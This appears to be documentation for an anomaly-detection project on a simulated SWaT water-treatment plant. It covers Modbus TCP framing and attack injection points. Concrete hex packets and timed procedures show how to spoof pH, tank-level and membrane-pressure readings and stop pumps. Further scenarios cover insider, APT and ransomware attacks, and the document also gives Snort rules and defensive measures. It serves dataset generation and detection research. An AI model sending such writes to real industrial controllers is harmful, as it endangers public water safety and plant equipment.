# SWAT COMMUNICATION PROTOCOLS & ATTACK SURFACES
# Complete Analysis of Network Architecture and Attack Injection Points

---

## TABLE OF CONTENTS

1. [System Architecture Overview](#system-architecture-overview)
2. [Modbus TCP Protocol Deep Dive](#modbus-tcp-protocol-deep-dive)
3. [Stage-by-Stage Communication Flow](#stage-by-stage-communication-flow)
4. [Attack Surfaces and Injection Points](#attack-surfaces-and-injection-points)
5. [Protocol Vulnerabilities](#protocol-vulnerabilities)
6. [Network Topology](#network-topology)
7. [Real-World Attack Scenarios](#real-world-attack-scenarios)

---

## SYSTEM ARCHITECTURE OVERVIEW

### SWAT Water Treatment Plant - 6 Stages

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         SWAT WATER TREATMENT SYSTEM                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Stage 1: RAW WATER INTAKE         Stage 4: UV DISINFECTION            │
│  ├─ FIT_101 (Flow sensor)          ├─ UV_401 (UV lamp)                 │
│  ├─ LIT_101 (Level sensor)         ├─ LIT_401 (Tank level)             │
│  ├─ P_101, P_102 (Pumps)           └─ P_401, P_402 (Pumps)             │
│  └─ MV_101 (Motorized valve)                                           │
│                                     Stage 5: RO SYSTEM                  │
│  Stage 2: CHEMICAL DOSING           ├─ FIT_501 (Permeate flow)          │
│  ├─ AIT_201 (Turbidity)            ├─ PIT_501 (Feed pressure)          │
│  ├─ AIT_202 (pH sensor) ◄──────┐   ├─ AIT_501-503 (Conductivity/ORP)  │
│  ├─ P_203 (Acid pump)      CRITICAL   └─ P_501 (High-pressure pump)        │
│  ├─ P_205 (Chlorine pump)      │                                       │
│  ├─ Acid/Cl₂/Coag tanks        │   Stage 6: BACKWASH & CLEAN WATER    │
│  └─ MV_201 (Control valve)     │   ├─ FIT_601 (Product flow)          │
│                                 │   └─ P_601 (Product pump)            │
│  Stage 3: UF FILTRATION ────────┘                                      │
│  ├─ DPIT_301 (TMP sensor) ◄─────── CRITICAL                           │
│  ├─ LIT_301 (Tank level)                                              │
│  ├─ MV_301-304 (Filter valves)                                        │
│  ├─ UF_Backwash_Active (State)                                        │
│  └─ P_301, P_302 (Feed pumps)                                         │
│                                                                         │
│  Alarms: High_Level, Chemical_Low, High_Fouling, High_Pressure        │
└─────────────────────────────────────────────────────────────────────────┘
```

### Control Hierarchy

```
┌────────────────────────────────────────┐
│         SCADA Server (HMI)             │  ◄─── Operator Interface
│    (Supervisory Control Layer)         │       (Visualization, Manual Control)
└──────────────────┬─────────────────────┘
                   │ Ethernet TCP/IP
                   │ (Modbus TCP, Port 502 or 1502)
┌──────────────────▼─────────────────────┐
│           PLC (Controller)             │  ◄─── Logic Layer
│     Rockwell/Siemens/Schneider         │       (Ladder Logic, PID Control)
│   IP: 192.168.1.100, Port: 1502        │
└──────────────────┬─────────────────────┘
                   │ Modbus TCP
                   │ (Read: FC3/FC1, Write: FC6/FC5)
┌──────────────────▼─────────────────────┐
│       Field Devices (I/O Modules)      │  ◄─── Physical Layer
│  ├─ Sensors (FIT, LIT, AIT, PIT)      │       (Analog/Digital I/O)
│  ├─ Actuators (Pumps, Valves)         │
│  └─ Alarms (Discrete Outputs)         │
└────────────────────────────────────────┘
```

---

## MODBUS TCP PROTOCOL DEEP DIVE

### Protocol Stack

```
┌────────────────────────────────┐
│   Application Layer            │  ◄─── Modbus Protocol Data Unit (PDU)
│   (Modbus Function Codes)      │
├────────────────────────────────┤
│   Modbus Application Header    │  ◄─── MBAP Header (7 bytes)
│   (Transaction ID, Unit ID)    │
├────────────────────────────────┤
│   TCP (Transmission Control)   │  ◄─── Port 502 (standard) or 1502 (SWAT)
├────────────────────────────────┤
│   IP (Internet Protocol)       │  ◄─── 192.168.1.100 (PLC address)
├────────────────────────────────┤
│   Ethernet (Data Link)         │  ◄─── MAC addresses, frames
└────────────────────────────────┘
```

### Modbus TCP Frame Structure

```
MBAP Header (7 bytes):
┌─────────────┬─────────────┬──────────┬─────────┐
│ Trans ID    │ Protocol ID │ Length   │ Unit ID │
│ (2 bytes)   │ (2 bytes)   │ (2 bytes)│ (1 byte)│
└─────────────┴─────────────┴──────────┴─────────┘
     ↓               ↓            ↓          ↓
  Request ID    Always 0x0000  Bytes to  Slave ID
  (matches       (Modbus TCP)   follow   (1 = PLC)
   response)

PDU (varies):
┌─────────────┬────────────────────────┐
│ Function    │ Data                   │
│ Code        │ (address, count, etc.) │
│ (1 byte)    │ (N bytes)              │
└─────────────┴────────────────────────┘
```

### Function Codes Used in SWAT

| FC | Name | Usage in SWAT | Example |
|----|------|---------------|---------|
| 01 | Read Coils | Read pump/valve states (P_101, MV_101) | Read coils 0-24 (25 total) |
| 03 | Read Holding Registers | Read sensor values (pH, level, flow) | Read regs 0-50 (51 total) |
| 05 | Write Single Coil | Turn pump ON/OFF | Write coil 4 (P_203 acid pump) |
| 06 | Write Single Register | Set sensor value (ATTACK) | Write reg 4 (AIT_202 pH) |
| 16 | Write Multiple Registers | Bulk sensor manipulation | Write regs 0-10 |

### Read Request Example (FC3 - Read Holding Registers)

**Request from logger to PLC:**
```
MBAP Header:
  Transaction ID: 0x0001       (Request #1)
  Protocol ID:    0x0000       (Modbus TCP)
  Length:         0x0006       (6 bytes follow)
  Unit ID:        0x01         (PLC unit 1)

PDU:
  Function Code:  0x03         (Read Holding Registers)
  Start Address:  0x0000       (Register 0 = FIT_101)
  Quantity:       0x0033       (51 registers = 0-50)

Total: 12 bytes
Hex: 00 01 00 00 00 06 01 03 00 00 00 33
```

**Response from PLC:**
```
MBAP Header:
  Transaction ID: 0x0001       (Matches request)
  Protocol ID:    0x0000
  Length:         0x0067       (103 bytes follow)
  Unit ID:        0x01

PDU:
  Function Code:  0x03
  Byte Count:     0x66         (102 bytes = 51 registers × 2 bytes)
  Data:           [values...]  (51 × 16-bit values)

Example data (first 10 registers):
  FIT_101  = 0x0032 (50 → 5.0 m³/h)
  LIT_101  = 0x01F4 (500 L)
  MV_101   = 0x0002 (2 = auto)
  AIT_201  = 0x0190 (400 NTU)
  AIT_202  = 0x02D0 (720 → 7.20 pH)
  FIT_201  = 0x0028 (40 → 4.0 m³/h)
  ...
```

### Write Request Example (FC6 - Write Single Register)

**Attack: pH manipulation (write pH = 4.80)**
```
MBAP Header:
  Transaction ID: 0x00A3
  Protocol ID:    0x0000
  Length:         0x0006
  Unit ID:        0x01

PDU:
  Function Code:  0x06         (Write Single Register)
  Register Addr:  0x0004       (AIT_202 = pH sensor)
  Register Value: 0x01E0       (480 = 4.80 pH × 100)

Total: 12 bytes
Hex: 00 A3 00 00 00 06 01 06 00 04 01 E0
```

**Response (echo):**
```
Same as request (confirms write succeeded)
```

---

## STAGE-BY-STAGE COMMUNICATION FLOW

### Stage 1: Raw Water Intake

**Normal Operation (every 1 second):**

```
Logger → PLC:
  [FC3] Read registers 0-2 (FIT_101, LIT_101, MV_101)
  
PLC → Logger:
  FIT_101 = 50   (5.0 m³/h inflow)
  LIT_101 = 520  (520 L in tank)
  MV_101  = 2    (valve in auto mode)

Logger → PLC:
  [FC1] Read coils 0-1 (P_101, P_102)
  
PLC → Logger:
  P_101 = True   (Pump 1 running)
  P_102 = False  (Pump 2 standby)
```

**Attack: Tank Overflow**

```
t=0s:
Attacker → PLC:
  [FC5] Write coil 0 = False   (Stop P_101)
  [FC5] Write coil 1 = False   (Stop P_102)

t=1s to t=180s (every second):
Attacker → PLC:
  [FC6] Write register 1 = sigmoid_value(t)
  Example t=60s: Write LIT_101 = 750
  Example t=120s: Write LIT_101 = 950

PLC → Logger (sees spoofed values):
  LIT_101 = 950, P_101 = False, P_102 = False
  
Logger → CSV:
  Timestamp, LIT_101=950, P_101=0, ATTACK_ID=8, "Tank Overflow Attack"
```

**Protocol packets (attack injection):**
```
Packet 1 (Stop pump):
  00 01 00 00 00 06 01 05 00 00 00 00
  └──┬──┘             └─┬─┘ └──┬──┘ └──┬──┘
   Trans ID          FC5  Coil 0  OFF

Packet 2 (Manipulate level):
  00 02 00 00 00 06 01 06 00 01 03 B6
  └──┬──┘             └─┬─┘ └──┬──┘ └──┬──┘
   Trans ID          FC6  Reg 1  950
```

---

### Stage 2: Chemical Dosing & pH Control

**Normal Operation:**

```
Logger → PLC:
  [FC3] Read registers 3-10
  
PLC → Logger:
  AIT_201 = 450    (45.0 NTU turbidity)
  AIT_202 = 720    (7.20 pH)
  FIT_201 = 45     (4.5 m³/h)
  ...
  Acid_Tank = 78   (78% level)
  Chlorine_Tank = 82
  Coagulant_Tank = 90

Logger → PLC:
  [FC1] Read coils 2-7 (P_201-P_206)
  
PLC → Logger:
  P_203 = True     (Acid pump dosing - maintains pH 7.0-7.5)
  P_205 = True     (Chlorine dosing)
```

**Attack: pH Manipulation (Exponential Drift)**

```
t=0s:
Attacker → PLC:
  [FC5] Write coil 4 = False   (Stop acid pump P_203)

t=1s to t=120s (exponential approach):
  pH_target = 480  (4.80)
  tau = 40s
  
  For each second t:
    pH(t) = 480 + (720-480) * exp(-t/40)
    
    Attacker → PLC:
      [FC6] Write register 4 = pH(t)
    
    Example t=40s (1τ):
      pH = 480 + 240*0.368 = 568 (5.68)
      Packet: 00 XX 00 00 00 06 01 06 00 04 02 38

Logger sees gradual drift:
  t=0:   pH=7.20, P_203=True,  ATTACK_ID=0
  t=1:   pH=7.18, P_203=False, ATTACK_ID=11  ← attack starts
  t=30:  pH=6.45, P_203=False, ATTACK_ID=11
  t=60:  pH=5.75, P_203=False, ATTACK_ID=11
  t=120: pH=4.95, P_203=False, ATTACK_ID=11
  t=121: pH=5.02, P_203=True,  ATTACK_ID=0   ← attack ends
```

**Why this works:**
1. PLC reads REAL pH from sensor → 7.20
2. Attacker writes FAKE pH via Modbus → 4.80
3. PLC ladder logic sees fake value, stops dosing (thinks pH is too low)
4. Logger reads the FAKE value from PLC memory
5. CSV contains fake values with attack label

---

### Stage 3: UF Membrane Filtration

**Normal Operation:**

```
Logger → PLC:
  [FC3] Read registers 11-22
  
PLC → Logger:
  FIT_301 = 40      (4.0 m³/h feed flow)
  DPIT_301 = 250    (25.0 kPa transmembrane pressure)
  LIT_301 = 680     (680 L)
  MV_301-304 = 2    (Valves in auto)
  UF_Hours_Since_BW = 18  (18 hours since backwash)

Logger → PLC:
  [FC1] Read coils 8-10, 20
  
PLC → Logger:
  P_301 = True      (Feed pump running)
  P_302 = False     (Backup pump off)
  UF_Backwash_Active = False
```

**Attack: Membrane Damage (Exponential Pressure Creep)**

```
t=0s:
Attacker → PLC:
  [FC5] Write coil 20 = False   (Disable backwash)

t=1s to t=240s:
  TMP_target = 600 (60.0 kPa)
  tau = 96s
  
  For each second t:
    TMP(t) = 600 + (250-600) * exp(-t/96)
    
    Attacker → PLC:
      [FC6] Write register 12 = TMP(t)
      [FC6] Write register 21 += 1  (Increment hours counter)

Logger captures:
  t=0:   DPIT_301=250, UF_Backwash=True,  ATTACK_ID=0
  t=1:   DPIT_301=253, UF_Backwash=False, ATTACK_ID=10  ← attack
  t=60:  DPIT_301=380, Hours_Since_BW=61, ATTACK_ID=10
  t=180: DPIT_301=540, High_Fouling_Alarm=True, ATTACK_ID=10
```

---

### Stage 4-6: UV, RO, Backwash

Similar Modbus communication pattern:
- Logger polls sensors every 1s via FC3
- Logger polls actuators every 1s via FC1
- Attacker injects via FC5 (coils) and FC6 (registers)

---

## ATTACK SURFACES AND INJECTION POINTS

### Network Topology

```
┌─────────────────────────────────────────────────────────────────┐
│                         CORPORATE LAN                           │
│    (IT Network: Active Directory, Email, Internet Gateway)     │
└────────────────────────┬────────────────────────────────────────┘
                         │ Firewall (ideally)
                         │ Port 502/1502 ALLOWED ← Vulnerability
┌────────────────────────▼────────────────────────────────────────┐
│                      OPERATIONAL NETWORK (OT)                   │
│  ┌────────────┐      ┌────────────┐      ┌──────────────┐      │
│  │   SCADA    │◄────►│    PLC     │◄────►│  I/O Modules │      │
│  │   Server   │ TCP  │192.168.1.100│ TCP │   (Field)    │      │
│  └────────────┘ 1502 └────────────┘      └──────────────┘      │
│         ▲                  ▲                                     │
│         │                  │                                     │
│         │                  └──────────┐                          │
│         │                             │                          │
│  ┌──────▼──────────┐        ┌─────────▼──────┐                 │
│  │  Data Historian │        │  Attacker PC   │ ◄─── Attack PC  │
│  │  (Logger runs   │        │  (Compromise)  │                  │
│  │   here)         │        │                │                  │
│  └─────────────────┘        └────────────────┘                  │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Surface Analysis

| Component | Protocol | Port | Attack Vector |
|-----------|----------|------|---------------|
| SCADA → PLC | Modbus TCP | 1502 | ✗ Usually authenticated, monitored |
| Logger → PLC | Modbus TCP | 1502 | ✓ READ-ONLY, but attacker can spoof source |
| Attacker → PLC | Modbus TCP | 1502 | ✓ **PRIMARY ATTACK SURFACE** |
| Field I/O → PLC | Modbus TCP/RTU | varies | ✗ Physical access needed |

### Injection Points

**1. Man-in-the-Middle (MitM) Attack**
```
Normal:  Logger ────────► PLC
                  [FC3]

Attack:  Logger ────────► Attacker ────────► PLC
                  [FC3]             [FC3]
         Logger ◄──────── Attacker ◄──────── PLC
                  [fake]            [real]
```

Attacker intercepts traffic, modifies responses.

**2. Direct Write Attack (Command Injection)**
```
Attacker sends FC6/FC5 directly to PLC:

  [FC6] Write AIT_202 = 480  (pH manipulation)
  [FC5] Write P_101 = False  (pump stop)
  
PLC accepts (no authentication!)
Logger reads manipulated values
```

**3. Replay Attack**
```
1. Attacker captures 60 seconds of normal traffic
2. Attacker replays packets while executing attack
3. SCADA sees "normal" sensor readings (replay)
4. Physical process is under attack
```

---

## PROTOCOL VULNERABILITIES

### Modbus TCP Security Issues

| Vulnerability | Impact | Mitigation |
|---------------|--------|------------|
| **No Authentication** | Anyone can write to PLC | Firewall, VLANs, Modbus/TCP Security |
| **No Encryption** | Cleartext sensor values | TLS wrapper, VPN |
| **No Integrity Check** | Packets can be modified | HMAC, digital signatures |
| **No Replay Protection** | Old packets can be reused | Sequence numbers, timestamps |
| **Broadcast Storm** | DoS via FC16 spam | Rate limiting, IDS |

### Real-World Vulnerabilities

**CVE-2020-12004 (Schneider PLC)**
- Unauthenticated Modbus write allows arbitrary code execution
- Attacker can write to coil 0x9999 to trigger firmware update mode

**CVE-2019-6569 (Siemens S7)**
- Modbus gateway allows write to protected registers
- Bypass safety interlocks via FC16

**Stuxnet (2010)**
- Exploited Siemens Step7 via 0-day
- Modified ladder logic to cause centrifuge damage
- Replayed "normal" sensor values to SCADA

---

## REAL-WORLD ATTACK SCENARIOS

### Scenario 1: Insider Threat (Disgruntled Operator)

```
Attacker: Plant operator with SCADA access
Goal: Cause membrane damage (expensive repair)

Step 1: Login to SCADA (legitimate credentials)
Step 2: Open engineering software (Rockwell Studio 5000)
Step 3: Modify ladder logic:
  IF DPIT_301 > 400 THEN UF_Backwash = False
  (Disable backwash at high pressure)

Step 4: Download modified logic to PLC
Step 5: Wait for pressure to rise naturally
Step 6: Membrane ruptures within 24 hours

Detection Difficulty: High (looks like equipment failure)
```

### Scenario 2: External APT (Advanced Persistent Threat)

```
Attacker: Nation-state actor
Goal: Data exfiltration + long-term access

Phase 1 - Initial Access (Week 1):
  - Spear-phishing email to engineer
  - Malware establishes C2 channel
  
Phase 2 - Lateral Movement (Week 2-3):
  - Pivot from IT network to OT network
  - Scan for Modbus devices (port 502, 1502)
  - Discover PLC at 192.168.1.100
  
Phase 3 - Reconnaissance (Week 4-8):
  - Sniff Modbus traffic (passive)
  - Map all registers and coils
  - Identify critical sensors (pH, TMP)
  
Phase 4 - Attack (Day X):
  - Multi-variable stealth attack:
    • pH drifts from 7.2 → 6.6 (below alarm)
    • TMP drifts from 25 → 35 kPa (below alarm)
    • Acid tank level drops 80% → 60%
  - No single alarm triggers
  - Water quality degrades over days
  - Attack attributed to "aging equipment"

Detection Difficulty: Extreme (requires ML anomaly detection)
```

### Scenario 3: Ransomware with ICS Component

```
Attacker: Cybercriminal group
Goal: Encrypt SCADA + hold plant hostage

Step 1: Ransomware spreads to SCADA server
Step 2: Encrypt historian database (all past data lost)
Step 3: Before encrypting, inject attack via Modbus:
  - Open all valves (MV_101-304 = 1)
  - Turn off all pumps (P_101-601 = False)
  - Set tank levels to 0 (LIT_101/301/401 = 0)
  
Step 4: Encrypt SCADA, display ransom note
Step 5: Operators panic (can't see process state)
Step 6: Physical damage begins (tanks overflow)

Ransom demand: $500k USD in Bitcoin
Alternative: Restore from backups (if available)

Detection: Immediate (all sensors show 0)
Response time: Critical (15 minutes before overflow)
```

---

## DETECTION STRATEGIES

### Network-Level Detection

```
IDS Rules (Snort/Suricata):

alert tcp any any -> 192.168.1.100 1502 (
  msg: "Modbus Write to Critical Register";
  content: "|06|";  # FC6
  content: "|00 04|";  # Register 4 (pH)
  threshold: type limit, track by_src, count 5, seconds 60;
)

alert tcp any any -> 192.168.1.100 1502 (
  msg: "Modbus Bulk Write (FC16)";
  content: "|10|";
  detection_filter: track by_src, count 10, seconds 10;
)
```

### Host-Level Detection (PLC)

```
Whitelist approach:
- Only SCADA IP (192.168.1.50) can write to PLC
- Data historian (192.168.1.51) can only READ
- Block all other IPs at PLC firewall

Modbus Application Firewall:
- Allow FC3, FC1 (reads) from all
- Allow FC5, FC6 (writes) only from SCADA
- Block FC16 (bulk writes) entirely
```

### ML-Based Detection (this project)

```
Features from CSV dataset:
- Rate-of-change anomalies (dPH/dt > threshold)
- Mass balance violations (inflow ≠ outflow + accumulation)
- Correlation breakage (pump OFF but flow HIGH)
- Temporal patterns (LSTM learns attack signatures)

Models trained:
- XGBoost: Best accuracy (91.8%)
- LSTM: Best temporal detection (long attacks)
- Isolation Forest: Novel attack detection (zero-day)
```

---

## SUMMARY

### Communication Flow

```
Normal Operation:
  Logger ──[FC3/FC1]──► PLC ──[sensors]──► Physical Process
         ◄─[values]────┘

Attack Scenario:
  Logger ──[FC3/FC1]──► PLC ◄─[FC6/FC5]── Attacker
         ◄─[FAKE!]─────┘        │
                                │
  Attacker ───[metadata.json]──► Logger CSV
         (labels attack rows)
```

### Key Protocols

| Stage | Sensors | Actuators | Protocol | Attack Vector |
|-------|---------|-----------|----------|---------------|
| 1 | FIT_101, LIT_101 | P_101/102, MV_101 | Modbus FC3/FC1 | Tank overflow (write LIT, stop pumps) |
| 2 | AIT_202 (pH) | P_203 (acid) | Modbus FC3/FC5 | pH manipulation (write pH, stop pump) |
| 3 | DPIT_301 (TMP) | UF_Backwash | Modbus FC3/FC5 | Membrane damage (write TMP, disable BW) |
| 4 | LIT_401 | UV_401 | Modbus FC3/FC5 | UV bypass |
| 5 | PIT_501 | P_501 | Modbus FC3/FC5 | Pressure attack |
| 6 | FIT_601 | P_601 | Modbus FC3/FC5 | Product contamination |

### Attack Surface Priority

1. **Critical**: AIT_202 (pH), DPIT_301 (TMP), PIT_501 (RO pressure)
2. **High**: Tank levels (LIT_101/301/401), pump controls
3. **Medium**: Flow sensors, valve positions
4. **Low**: Alarms (read-only), temperatures

All attacks inject via Modbus TCP port 1502 using FC5 (coils) or FC6 (registers).